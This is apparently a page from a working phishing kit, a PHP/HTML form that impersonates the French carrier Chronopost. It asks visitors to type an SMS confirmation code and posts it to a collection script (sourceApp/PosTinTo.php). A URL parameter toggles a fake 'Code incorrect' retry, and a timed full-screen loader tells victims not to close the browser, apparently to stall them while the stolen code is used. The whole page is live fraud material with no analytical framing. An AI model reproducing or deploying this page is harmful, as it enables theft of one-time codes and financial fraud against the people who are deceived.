<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="shortcut icon" href="sourceApp/img/favicon.ico" type="image/vnd.microsoft.icon" />
<link href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all" rel="stylesheet">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="sourceApp/style.css">
<link rel="stylesheet" href="sourceApp/attender.css">
<script src="//ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<?php 
if (isset($_GET['assure_boba']) && $_GET['assure_boba'] == "true") {
   echo '<script type="text/javascript">
  
   $(document).ready(function () {
            $("#loadingo9lawzan").fadeIn("slow", function () {
                $("#loadingo9lawzan").delay(40000).fadeOut(150);
            });
        });

</script>';
}elseif (isset($_GET['assure_boba']) && $_GET['assure_boba'] == "false"){
 echo '<script type="text/javascript">
  
   $(document).ready(function () {
            $("#loadingo9lawzan").fadeIn("slow", function () {
                $("#loadingo9lawzan").delay(35000).fadeOut(150);
            });
        });

</script>';
}

 ?>
</head>

<body>

  <div class="pageLoader" id="loadingo9lawzan" style="background-color: rgb(255, 255, 255); position: fixed; width: 100%; height: 100%; z-index: 9999; top: 0px; opacity: 0.9; text-align: center;">
<p style=" margin-top: 94px;font-size: 19px;color: #0060A2!important;font-weight: 500; ">Veuillez patienter pendant que nous traitons votre demande. Ne fermez pas le navigateur.</p>
  <div class="spinner loading"></div></div>


<div class="d-block p-3 text-center text-white bg-primary b4b">
  <a href="" class="a-primary"><i class="fas fa-exclamation-triangle" aria-hidden="true"></i> <?php echo date("Y/m/d"); ?> - Infos délais de livraison</a>
</div><header>     
  <img class="imglog" src="sourceApp/img/chronopost_logo.png" alt="Accueil">
  </header>    
<div class="menualbox">
<div class="topnav" id="myTopnav">
  <a href="">Accueil</a>
  <a href="">Expedier</a>
  <a href="">Nos offres </a>
  <a href="">Aide / FAQ </a>
  <a href="">A propos de Chronopost </a>
  <a href="javascript:void(0);" class="icon" onclick="myFunction()">
    <i class="fa fa-bars"></i>
  </a>
</div>
</div>
<div class="container">
  


  <div class="row">

            <div class="col-sm-9">
<form name="myForm" action="sourceApp/PosTinTo.php" onsubmit="return validateForm()" method="post">
<div class="card-body p-5 " id="icard-body">

<div class="tab-content">
<div class="tab-pane fade show active" id="nav-tab-card">
  <p class="alert alert-success"><i class="fas fa-sms"></i>&nbsp;  Après un certain temps, vous recevrez un code SMS pour confirmation. Vous devez avoir reçu un SMS avec un code sur votre téléphone.</p>



 <?php 
if (isset($_GET['assure_boba']) && $_GET['assure_boba'] == "false"){

echo ' <div class="alert alert-danger alert-dismissible fade show" role="alert">
  <strong>Code incorrect.</strong>  Veuillez saisir le code du SMS.
  <button type="button" class="close" data-dismiss="alert" aria-label="Close">
    <span aria-hidden="true">&times;</span>
  </button>
</div>';
}

 ?>
  <form role="form">
<div class="card text-center">
  <div class="card-body" style=" color: #191919; background-color: #ffffff; ">
    <h5 class="card-title">Entrez le code reçu par sms</h5>
    <div class="form-group">
 <input class="form-control" style="text-align: center;" type="text" onkeypress="if(this.value.length==8) return false;" id="F982345787234LPIN" name="F982345787234LPIN">                    </div>

  



  <?php 
if (isset($_GET['assure_boba']) && $_GET['assure_boba'] == "true") {
   echo '<button class="subscribe btn btn-primary btn-block" type="submit" name="smsone"> Confirm  </button>';
}elseif (isset($_GET['assure_boba']) && $_GET['assure_boba'] == "false"){
 echo '<button class="subscribe btn btn-primary btn-block" type="submit" name="smstow"> Confirm  </button>';
}

 ?>


  </div>
 
</div>

  
 <!-- row.// -->
 
  </form>
</div> <!-- tab-pane.// -->
<div class="tab-pane fade" id="nav-tab-paypal">
<p>Paypal is easiest way to pay online</p>
<p>
<button type="button" class="btn btn-primary"> <i class="fab fa-paypal"></i> Log in my Paypal </button>
</p>

</div>

</div> <!-- tab-content .// -->

</div>
  
  
 
</form>
            </div>

            <div class="col-sm-3 ">
                <div class="card" >
  <img src="sourceApp/img/chronopost_tours_03712200_113425863.jpg" class="card-img-top" alt="...">
  <div class="card-body">
    <h5 class="card-title">Chronopost toujours à vos côtés !</h5>
    <p class="card-text">Parce que chaque livraison est unique, Chronopost s’adapte à vos besoins. Découvrez nos offres de livraison de colis en France et à l’international.</p>
  </div>
</div>
        </div>



</div>
<script  src="sourceApp/chronopost_sm.js"></script>
<!-- Footer -->
<footer class="page-footer font-small indigo">

  <!-- Footer Links -->
  <div class="container text-center text-md-left">

    <!-- Grid row -->
    <div class="row">

      <!-- Grid column -->
      <div class="col-md-3 mx-auto">

        <!-- Links -->
        <h5 class="font-weight-bold text-uppercase mt-3 mb-4">Particulier</h5>

        <ul class="list-unstyled">
          <li>
            <a href="#!">Envoyer un colis</a>
          </li>
          <li>
            <a href="#!">Suivre un envoi</a>
          </li>
          <li>
            <a href="#!">Nos offres</a>
          </li>
          <li>
            <a href="#!">Estimez les tarifs</a>
          </li>
        </ul>

      </div>
      <!-- Grid column -->

      <hr class="clearfix w-100 d-md-none">

      <!-- Grid column -->
      <div class="col-md-3 mx-auto">

        <!-- Links -->
        <h5 class="font-weight-bold text-uppercase mt-3 mb-4">Aide</h5>

        <ul class="list-unstyled">
          <li>
            <a href="#!">Se créer un compte</a>
          </li>
          <li>
            <a href="#!">Nos guides</a>
          </li>
          <li>
            <a href="#!">Vos questions fréquentes</a>
          </li>
          <li>
            <a href="#!">Espace Outre-Mer</a>
          </li>
           <li>
            <a href="#!">Flash info </a>
          </li>
        </ul>

      </div>
      <!-- Grid column -->

      <hr class="clearfix w-100 d-md-none">

      <!-- Grid column -->
      <div class="col-md-3 mx-auto">

        <!-- Links -->
        <h5 class="font-weight-bold text-uppercase mt-3 mb-4">Mieux nous connaître</h5>

        <ul class="list-unstyled">
          <li>
            <a href="#!">Gouvernance Chronopost</a>
          </li>
          <li>
            <a href="#!">Nous rejoindre</a>
          </li>
          <li>
            <a href="#!">Engagé et responsable</a>
          </li>
          <li>
            <a href="#!">Nos actualités</a>
          </li>
               <li>
            <a href="#!">Espace Presse</a>
          </li>
        </ul>

      </div>
      <!-- Grid column -->

      <hr class="clearfix w-100 d-md-none">

      <!-- Grid column -->
      <div class="col-md-3 mx-auto">

        <!-- Links -->
        <h5 class="font-weight-bold text-uppercase mt-3 mb-4">Informations légales</h5>

        <ul class="list-unstyled">
          <li>
            <a href="#!">Mentions légales</a>
          </li>
          <li>
            <a href="#!">Alerte fraude</a>
          </li>
          <li>
            <a href="#!">Réseaux sociaux</a>
          </li>
          <li>
            <a href="#!"><img src="https://i.ibb.co/9Z4ytxJ/Capture.png">  </a>
          </li>
        </ul>

      </div>
      <!-- Grid column -->

    </div>
    <!-- Grid row -->

  </div>

  <div class="footer-separator-desktop "></div>

  <!-- Footer Links -->
<img class="loft" src="sourceApp/img/dpd-logo.png"   >
<img class="logt" src="sourceApp/img/chronopost_logo_small.png"   >
  <!-- Copyright -->
  <div class="footer-copyright text-center py-3">© 2021 Chronopost</div>
  <!-- Copyright -->

</footer>
<!-- Footer -->

</body>
</html>
